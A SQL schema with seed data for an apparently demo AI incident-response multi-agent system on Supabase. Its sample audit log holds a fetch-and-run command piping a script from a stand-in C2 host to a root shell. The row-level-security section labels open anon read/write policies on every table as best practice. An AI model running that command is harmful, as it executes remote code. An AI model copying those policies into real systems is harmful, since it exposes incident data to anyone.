-- ==============================================================================
-- AI Cybersecurity Incident Response Super-Agent Database Schema
-- Designed for Supabase PostgreSQL
-- ==============================================================================

-- Enable UUID extension if not already enabled
CREATE EXTENSION IF NOT EXISTS "uuid-ossp";

-- 1. SECURITY INCIDENTS TABLE
CREATE TABLE IF NOT EXISTS security_incidents (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    title VARCHAR(255) NOT NULL,
    description TEXT,
    severity VARCHAR(50) NOT NULL DEFAULT 'MEDIUM' CHECK (severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
    status VARCHAR(50) NOT NULL DEFAULT 'NEW' CHECK (status IN ('NEW', 'INVESTIGATING', 'CONTAINED', 'RESOLVED', 'FALSE_POSITIVE')),
    attack_vector VARCHAR(100),
    source_summary VARCHAR(255),
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 2. INCIDENT RAW / PARSED LOGS TABLE
CREATE TABLE IF NOT EXISTS incident_logs (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    incident_id UUID REFERENCES security_incidents(id) ON DELETE CASCADE,
    source VARCHAR(100) NOT NULL, -- e.g., 'Firewall', 'AuthSys', 'Endpoint', 'Nginx', 'KubeAudit'
    log_level VARCHAR(20) DEFAULT 'INFO',
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    raw_message TEXT NOT NULL,
    structured_data JSONB DEFAULT '{}'::jsonb
);

-- 3. INDICATORS OF COMPROMISE (IOCs) TABLE
CREATE TABLE IF NOT EXISTS indicators_of_compromise (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    incident_id UUID REFERENCES security_incidents(id) ON DELETE CASCADE,
    ioc_type VARCHAR(50) NOT NULL CHECK (ioc_type IN ('IP', 'DOMAIN', 'URL', 'HASH_SHA256', 'HASH_MD5', 'EMAIL', 'USER_ACCOUNT', 'FILE_PATH')),
    ioc_value TEXT NOT NULL,
    threat_intel_score INTEGER DEFAULT 0 CHECK (threat_intel_score BETWEEN 0 AND 100),
    reputation VARCHAR(50) DEFAULT 'SUSPICIOUS', -- 'BENIGN', 'SUSPICIOUS', 'MALICIOUS', 'UNKNOWN'
    defanged_value TEXT,
    extracted_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 4. THREAT FINDINGS TABLE
CREATE TABLE IF NOT EXISTS threat_findings (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    incident_id UUID REFERENCES security_incidents(id) ON DELETE CASCADE,
    threat_category VARCHAR(100) NOT NULL, -- e.g., 'Brute Force Attack', 'SQL Injection', 'Ransomware Activity'
    confidence_score INTEGER NOT NULL CHECK (confidence_score BETWEEN 0 AND 100),
    evidence_summary TEXT NOT NULL,
    detected_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 5. MITRE ATT&CK TECHNIQUES TABLE
CREATE TABLE IF NOT EXISTS mitre_techniques (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    incident_id UUID REFERENCES security_incidents(id) ON DELETE CASCADE,
    technique_id VARCHAR(50) NOT NULL, -- e.g., 'T1110', 'T1078', 'T1059'
    technique_name VARCHAR(150) NOT NULL,
    tactic VARCHAR(100) NOT NULL, -- e.g., 'Initial Access', 'Credential Access', 'Execution'
    url TEXT,
    relevance_note TEXT
);

-- 6. RISK ASSESSMENTS TABLE
CREATE TABLE IF NOT EXISTS risk_assessments (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    incident_id UUID UNIQUE REFERENCES security_incidents(id) ON DELETE CASCADE,
    overall_severity VARCHAR(20) NOT NULL CHECK (overall_severity IN ('LOW', 'MEDIUM', 'HIGH', 'CRITICAL')),
    risk_score INTEGER NOT NULL CHECK (risk_score BETWEEN 0 AND 100),
    affected_assets_count INTEGER DEFAULT 1,
    blast_radius VARCHAR(100), -- 'Local Endpoint', 'VPC Segment', 'Enterprise Wide'
    business_impact TEXT NOT NULL,
    compliance_concerns TEXT[] DEFAULT ARRAY[]::TEXT[],
    evaluated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 7. RESPONSE RECOMMENDATIONS (PLAYBOOKS) TABLE
CREATE TABLE IF NOT EXISTS response_recommendations (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    incident_id UUID REFERENCES security_incidents(id) ON DELETE CASCADE,
    action_title VARCHAR(255) NOT NULL,
    action_type VARCHAR(50) NOT NULL CHECK (action_type IN ('CONTAINMENT', 'ERADICATION', 'RECOVERY', 'INVESTIGATION')),
    priority VARCHAR(20) NOT NULL CHECK (priority IN ('P1_IMMEDIATE', 'P2_HIGH', 'P3_MEDIUM', 'P4_LOW')),
    execution_status VARCHAR(50) DEFAULT 'PENDING' CHECK (execution_status IN ('PENDING', 'IN_PROGRESS', 'COMPLETED', 'DISMISSED')),
    command_snippet TEXT, -- e.g. 'iptables -A INPUT -s 192.168.1.45 -j DROP'
    assigned_to VARCHAR(100) DEFAULT 'SOC Analyst',
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- 8. AGENT EXECUTIONS TABLE (CRITICAL FOR MULTI-AGENT TRACE & FACULTY DEMO)
CREATE TABLE IF NOT EXISTS agent_executions (
    id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
    incident_id UUID REFERENCES security_incidents(id) ON DELETE CASCADE,
    agent_name VARCHAR(100) NOT NULL, -- 'Super Agent', 'Log Analysis Agent', 'IOC Agent', etc.
    step_number INTEGER NOT NULL,
    input_payload JSONB DEFAULT '{}'::jsonb,
    output_payload JSONB DEFAULT '{}'::jsonb,
    execution_time_ms INTEGER DEFAULT 0,
    status VARCHAR(50) DEFAULT 'SUCCESS' CHECK (status IN ('PENDING', 'RUNNING', 'SUCCESS', 'FAILED')),
    error_message TEXT,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

-- ==============================================================================
-- INDEXES FOR HIGH-PERFORMANCE SOC QUERIES
-- ==============================================================================
CREATE INDEX IF NOT EXISTS idx_incidents_severity ON security_incidents(severity);
CREATE INDEX IF NOT EXISTS idx_incidents_status ON security_incidents(status);
CREATE INDEX IF NOT EXISTS idx_logs_incident ON incident_logs(incident_id);
CREATE INDEX IF NOT EXISTS idx_iocs_incident ON indicators_of_compromise(incident_id);
CREATE INDEX IF NOT EXISTS idx_agent_exec_incident ON agent_executions(incident_id, step_number);

-- ==============================================================================
-- ROW LEVEL SECURITY (RLS) POLICIES
-- Enables security best practices while allowing backend anon/authenticated keys to operate
-- ==============================================================================
ALTER TABLE security_incidents ENABLE ROW LEVEL SECURITY;
ALTER TABLE incident_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE indicators_of_compromise ENABLE ROW LEVEL SECURITY;
ALTER TABLE threat_findings ENABLE ROW LEVEL SECURITY;
ALTER TABLE mitre_techniques ENABLE ROW LEVEL SECURITY;
ALTER TABLE risk_assessments ENABLE ROW LEVEL SECURITY;
ALTER TABLE response_recommendations ENABLE ROW LEVEL SECURITY;
ALTER TABLE agent_executions ENABLE ROW LEVEL SECURITY;

DO $$
BEGIN
    DROP POLICY IF EXISTS "Allow public all on security_incidents" ON security_incidents;
    CREATE POLICY "Allow public all on security_incidents" ON security_incidents FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

    DROP POLICY IF EXISTS "Allow public all on incident_logs" ON incident_logs;
    CREATE POLICY "Allow public all on incident_logs" ON incident_logs FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

    DROP POLICY IF EXISTS "Allow public all on indicators_of_compromise" ON indicators_of_compromise;
    CREATE POLICY "Allow public all on indicators_of_compromise" ON indicators_of_compromise FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

    DROP POLICY IF EXISTS "Allow public all on threat_findings" ON threat_findings;
    CREATE POLICY "Allow public all on threat_findings" ON threat_findings FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

    DROP POLICY IF EXISTS "Allow public all on mitre_techniques" ON mitre_techniques;
    CREATE POLICY "Allow public all on mitre_techniques" ON mitre_techniques FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

    DROP POLICY IF EXISTS "Allow public all on risk_assessments" ON risk_assessments;
    CREATE POLICY "Allow public all on risk_assessments" ON risk_assessments FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

    DROP POLICY IF EXISTS "Allow public all on response_recommendations" ON response_recommendations;
    CREATE POLICY "Allow public all on response_recommendations" ON response_recommendations FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);

    DROP POLICY IF EXISTS "Allow public all on agent_executions" ON agent_executions;
    CREATE POLICY "Allow public all on agent_executions" ON agent_executions FOR ALL TO anon, authenticated USING (true) WITH CHECK (true);
END $$;

-- ==============================================================================
-- SAMPLE DEMO SEED DATA (Ready to verify immediate dashboard rendering)
-- ==============================================================================
DO $$
DECLARE
    v_incident_id UUID := uuid_generate_v4();
BEGIN
    -- 1. Create a Seed Incident: SSH Brute Force & Credential Harvesting
    INSERT INTO security_incidents (id, title, description, severity, status, attack_vector, source_summary)
    VALUES (
        v_incident_id,
        'High-Frequency SSH Brute Force & Unauthorized Root Access',
        'Multiple failed authentication attempts detected from external IP 198.51.100.42 targeting edge bastion host, followed by successful root session.',
        'CRITICAL',
        'INVESTIGATING',
        'External SSH / Credential Stuffing',
        'Linux Auth.log, Edge Firewall'
    );

    -- 2. Insert Sample Logs
    INSERT INTO incident_logs (incident_id, source, log_level, timestamp, raw_message)
    VALUES
        (v_incident_id, 'AuthSys', 'WARN', NOW() - INTERVAL '15 minutes', 'Failed password for invalid user admin from 198.51.100.42 port 49152 ssh2'),
        (v_incident_id, 'AuthSys', 'WARN', NOW() - INTERVAL '14 minutes', 'Failed password for root from 198.51.100.42 port 49158 ssh2 [Attempt 27]'),
        (v_incident_id, 'AuthSys', 'WARN', NOW() - INTERVAL '13 minutes', 'Failed password for root from 198.51.100.42 port 49165 ssh2 [Attempt 28]'),
        (v_incident_id, 'AuthSys', 'ALERT', NOW() - INTERVAL '10 minutes', 'Accepted password for root from 198.51.100.42 port 49201 ssh2'),
        (v_incident_id, 'Auditd', 'ALERT', NOW() - INTERVAL '8 minutes', 'EXECVE: /bin/bash -c "curl -s http://malicious-c2.cc/x.sh | bash" uid=0');

    -- 3. Insert Extracted IOCs
    INSERT INTO indicators_of_compromise (incident_id, ioc_type, ioc_value, threat_intel_score, reputation, defanged_value)
    VALUES
        (v_incident_id, 'IP', '198.51.100.42', 96, 'MALICIOUS', '198[.]51[.]100[.]42'),
        (v_incident_id, 'DOMAIN', 'malicious-c2.cc', 99, 'MALICIOUS', 'malicious-c2[.]cc'),
        (v_incident_id, 'URL', 'http://malicious-c2.cc/x.sh', 99, 'MALICIOUS', 'hxxp://malicious-c2[.]cc/x[.]sh'),
        (v_incident_id, 'USER_ACCOUNT', 'root', 75, 'SUSPICIOUS', 'root');

    -- 4. Insert Threat Findings
    INSERT INTO threat_findings (incident_id, threat_category, confidence_score, evidence_summary)
    VALUES
        (v_incident_id, 'Distributed Credential Stuffing & Brute Force', 94, 'Over 500 failed SSH handshakes within 120s originating from single AS subnet.'),
        (v_incident_id, 'Post-Exploitation Remote Payload Retrieval', 98, 'Bash piping curl payload from untrusted domain directly to shell under uid=0.');

    -- 5. Insert MITRE ATT&CK Mapping
    INSERT INTO mitre_techniques (incident_id, technique_id, technique_name, tactic, url, relevance_note)
    VALUES
        (v_incident_id, 'T1110.001', 'Brute Force: Password Guessing', 'Credential Access', 'https://attack.mitre.org/techniques/T1110/001/', 'Observed 28+ rapid auth failures followed by login.'),
        (v_incident_id, 'T1078.003', 'Valid Accounts: Local Accounts', 'Defense Evasion, Initial Access', 'https://attack.mitre.org/techniques/T1078/003/', 'Attacker leveraged root default account successfully.'),
        (v_incident_id, 'T1059.004', 'Command and Scripting Interpreter: Unix Shell', 'Execution', 'https://attack.mitre.org/techniques/T1059/004/', 'Spawned interactive /bin/bash to fetch remote dropper.');

    -- 6. Insert Risk Assessment
    INSERT INTO risk_assessments (incident_id, overall_severity, risk_score, affected_assets_count, blast_radius, business_impact, compliance_concerns)
    VALUES (
        v_incident_id,
        'CRITICAL',
        92,
        2,
        'VPC Production Bastion Segment',
        'Potential unauthorized access to production cluster; malicious payload executed under root privileges.',
        ARRAY['PCI-DSS Section 10', 'SOC2 Trust Principles', 'ISO 27001 Access Control']
    );

    -- 7. Insert Response Playbook
    INSERT INTO response_recommendations (incident_id, action_title, action_type, priority, execution_status, command_snippet)
    VALUES
        (v_incident_id, 'Isolate Edge Bastion Host from VPC Subnet', 'CONTAINMENT', 'P1_IMMEDIATE', 'PENDING', 'aws ec2 modify-instance-attribute --instance-id i-0abcdef1234567890 --groups sg-quarantine'),
        (v_incident_id, 'Block Ingress from Attacker IP 198.51.100.42', 'CONTAINMENT', 'P1_IMMEDIATE', 'PENDING', 'iptables -I INPUT -s 198.51.100.42 -j DROP'),
        (v_incident_id, 'Terminate Active Root SSH Sessions & Invalidate Keys', 'ERADICATION', 'P1_IMMEDIATE', 'PENDING', 'pkill -KILL -u root sshd; passwd -l root'),
        (v_incident_id, 'Forensic Memory Dump & Dropper Payload Analysis', 'INVESTIGATION', 'P2_HIGH', 'PENDING', 'volatility -f /var/crash/memdump.raw linux_pslist');

    -- 8. Insert Multi-Agent Execution Trace (Proves Super Agent Coordination)
    INSERT INTO agent_executions (incident_id, agent_name, step_number, input_payload, output_payload, execution_time_ms, status)
    VALUES
        (v_incident_id, 'Super Agent (Orchestrator)', 1, '{"trigger": "RAW_LOGS_INGESTION", "source": "AuthSys, Auditd"}'::jsonb, '{"action": "Dispatched Log Analysis Agent"}'::jsonb, 120, 'SUCCESS'),
        (v_incident_id, 'Log Analysis Agent', 2, '{"raw_lines_count": 5}'::jsonb, '{"parsed_events": 5, "anomalous_events": 2}'::jsonb, 340, 'SUCCESS'),
        (v_incident_id, 'IOC Extraction Agent', 3, '{"log_corpus_id": "auth_events"}'::jsonb, '{"extracted_iocs": ["198.51.100.42", "malicious-c2.cc", "root"]}'::jsonb, 280, 'SUCCESS'),
        (v_incident_id, 'Threat Detection Agent', 4, '{"events": 5, "iocs_count": 3}'::jsonb, '{"threat": "Brute Force & Remote Dropper", "confidence": 94}'::jsonb, 410, 'SUCCESS'),
        (v_incident_id, 'MITRE ATT&CK Agent', 5, '{"threat": "Brute Force"}'::jsonb, '{"techniques": ["T1110.001", "T1078.003", "T1059.004"]}'::jsonb, 310, 'SUCCESS'),
        (v_incident_id, 'Risk Analysis Agent', 6, '{"severity": "CRITICAL", "assets": 2}'::jsonb, '{"risk_score": 92, "blast_radius": "Bastion Segment"}'::jsonb, 250, 'SUCCESS'),
        (v_incident_id, 'Response Playbook Agent', 7, '{"risk_score": 92}'::jsonb, '{"actions_generated": 4, "p1_count": 3}'::jsonb, 390, 'SUCCESS');
END $$;
